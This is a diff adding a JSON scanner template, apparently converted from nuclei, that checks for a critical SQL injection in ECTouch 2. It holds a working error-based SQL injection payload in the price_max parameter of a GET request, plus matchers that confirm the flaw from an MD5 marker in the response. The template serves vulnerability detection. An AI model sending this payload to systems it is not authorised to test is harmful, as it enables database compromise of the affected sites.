@@ -1,0 +1,151 @@
+{
+  "id": "etouch-v2-sqli",
+  "name": "ECTouch 2 - SQL Injection",
+  "author": "princechaddha",
+  "severity": "CRITICAL",
+  "description": "ECTouch 2 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.",
+  "references": [
+    "https://github.com/mstxq17/CodeCheck/",
+    "https://www.anquanke.com/post/id/168991"
+  ],
+  "tags": [
+    "etouch",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-89",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/upload/mobile/index.php?c\u003dcategory\u0026a\u003dasynclist\u0026price_max\u003d1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5({{num}}),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)\u0027\u0027",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "{{md5({{num}})}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "etouch-v2-sqli",
+    "info": {
+      "name": "ECTouch 2 - SQL Injection",
+      "author": "princechaddha",
+      "severity": "critical",
+      "description": "ECTouch 2 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.",
+      "reference": [
+        "https://github.com/mstxq17/CodeCheck/",
+        "https://www.anquanke.com/post/id/168991"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-89"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "etouch,sqli"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/upload/mobile/index.php?c\u003dcategory\u0026a\u003dasynclist\u0026price_max\u003d1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5({{num}}),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)\u0027\u0027"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "{{md5({{num}})}}"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
